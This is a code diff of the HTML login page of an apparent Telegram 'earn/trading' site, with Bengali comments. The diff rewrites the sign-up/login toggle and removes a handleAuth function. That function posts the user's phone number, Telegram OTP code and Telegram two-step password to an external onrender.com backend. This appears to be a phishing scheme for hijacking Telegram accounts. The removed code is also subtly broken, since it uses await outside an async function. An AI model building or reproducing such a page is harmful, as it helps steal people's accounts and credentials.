@@ -190,115 +190,41 @@
     <div class="ad-unit">ADVERTISEMENT - BOTTOM</div>
 
     <script>
-        // রেন্ডার সাইটের লিঙ্ক (Corrected with https)
-        const API_BASE_URL = "https://aaf-tele-earn-treading.onrender.com";
-        let mode = 'login';
-        let step = 1;
+    const API_BASE_URL = "https://aaf-tele-earn-treading.onrender.com";
+    let mode = 'login';
+    let step = 1;
 
-        // মোড পরিবর্তন করার ফাংশন
-        function toggleMode(target) {
-            mode = target;
-            step = 1;
-            document.getElementById('form-header').innerText = (mode === 'login') ? "Login to Account" : "Create Account";
-            document.getElementById('submit-btn').innerText = "NEXT (SEND OTP)";
-            document.getElementById('signup-fields').style.display = (mode === 'login') ? "none" : "block";
-            document.getElementById('confirm-box').style.display = (mode === 'login') ? "none" : "block";
-            document.getElementById('verify-fields').style.display = "none";
-            document.getElementById('toggle-text').innerHTML = (mode === 'login') ? 
-                "New here? <span onclick='toggleMode(\"signup\")'>Sign Up</span>" : 
-                "Have an account? <span onclick='toggleMode(\"login\")'>Login</span>";
+    // এই ফাংশনটিই সাইন আপ ফর্ম দেখাবে
+    function toggleMode(target) {
+        mode = target;
+        step = 1;
+        
+        const header = document.getElementById('form-header');
+        const signupFields = document.getElementById('signup-fields');
+        const confirmBox = document.getElementById('confirm-box');
+        const submitBtn = document.getElementById('submit-btn');
+        const toggleText = document.getElementById('toggle-text');
+        const verifyFields = document.getElementById('verify-fields');
+
+        // ভেরিফাই ফিল্ড লুকিয়ে রাখা (শুরুতে)
+        verifyFields.style.display = "none";
+
+        if (mode === 'signup') {
+            header.innerText = "Create New Account";
+            signupFields.style.display = "block";
+            confirmBox.style.display = "block";
+            submitBtn.innerText = "NEXT (SEND OTP)";
+            toggleText.innerHTML = "Have an account? <span onclick='toggleMode(\"login\")' style='color:#39d353; cursor:pointer;'>Login</span>";
+        } else {
+            header.innerText = "Login to Account";
+            signupFields.style.display = "none";
+            confirmBox.style.display = "none";
+            submitBtn.innerText = "NEXT (SEND OTP)";
+            toggleText.innerHTML = "New here? <span onclick='toggleMode(\"signup\")' style='color:#39d353; cursor:pointer;'>Sign Up</span>";
         }
+    }
 
-        // মেইন অপারেশন ফাংশন
-        function handleAuth() {
-            const btn = document.getElementById('submit-btn');
-            const countryCode = document.getElementById('code').value;
-            const phoneNumber = document.getElementById('phone').value;
-            const fullPhone = countryCode + phoneNumber;
-            const sitePassword = document.getElementById('site-pass').value;
-
-            // ধাপ ১: ওটিপি পাঠানো
-            if (step === 1) {
-                if (!phoneNumber) return alert("দয়া করে ফোন নম্বর দিন!");
-                if (mode === 'signup') {
-                    const confirmPass = document.getElementById('confirm-pass').value;
-                    if (sitePassword !== confirmPass) return alert("পাসওয়ার্ড মেলেনি!");
-                }
-
-                btn.innerText = "ওটিপি পাঠানো হচ্ছে...";
-                btn.disabled = true;
-
-                try {
-                    // CORS Fix in fetch request
-                    const response = await fetch(`${API_BASE_URL}/api/send_otp`, {
-                        method: 'POST',
-                        mode: 'cors', // এটি মাস্ট
-                        headers: {
-                            'Content-Type': 'application/json',
-                            'Accept': 'application/json'
-                        },
-                        body: JSON.stringify({ phone: fullPhone })
-                    });
-                    const data = await response.json();
-                    
-                    if (data.success) {
-                        alert("আপনার টেলিগ্রাম অ্যাপে ওটিপি পাঠানো হয়েছে!");
-                        document.getElementById('verify-fields').style.display = 'block';
-                        btn.innerText = (mode === 'login') ? "VERIFY & LOGIN" : "FINISH SIGN UP";
-                        step = 2;
-                    } else {
-                        alert("ভুল: " + data.message);
-                    }
-                } catch (err) {
-                    alert("সার্ভার কানেকশন ফেইল্ড! রেন্ডার লিঙ্কটি চেক করুন।");
-                } finally {
-                    btn.disabled = false;
-                }
-            } 
-            // ধাপ ২: লগইন বা সাইনআপ ভেরিফাই করা
-            else {
-                const otpCode = document.getElementById('tele-code').value;
-                const twoStepPass = document.getElementById('two-step').value;
-                const fullName = document.getElementById('name').value;
-
-                if (!otpCode) return alert("টেলিগ্রাম ওটিপি কোডটি দিন!");
-                
-                btn.innerText = "প্রসেসিং হচ্ছে...";
-                btn.disabled = true;
-
-                try {
-                    const response = await fetch(`${API_BASE_URL}/api/verify_login`, {
-                        method: 'POST',
-                        mode: 'cors', // এটি মাস্ট
-                        headers: {
-                            'Content-Type': 'application/json',
-                            'Accept': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            phone: fullPhone,
-                            code: otpCode,
-                            password: twoStepPass, // টেলিগ্রাম ২-স্টেপ
-                            site_password: sitePassword, // আমাদের সাইট পাসওয়ার্ড
-                            name: fullName
-                        })
-                    });
-                    const data = await response.json();
-
-                    if (data.success) {
-                        localStorage.setItem('user_id', data.uid);
-                        alert("সফলভাবে সম্পন্ন হয়েছে!");
-                        window.location.href = "/dashboard";
-                    } else {
-                        alert("ব্যর্থ হয়েছে: " + data.message);
-                    }
-                } catch (err) {
-                    alert("ভেরিফিকেশন এরর!");
-                } finally {
-                    btn.disabled = false;
-                    btn.innerText = (mode === 'login') ? "LOGIN" : "FINISH SIGN UP";
-                }
-            }
-        }
+    // আপনার বাকি handleAuth() ফাংশনটি নিচে থাকবে...
     </script>
 </body>
 </html>
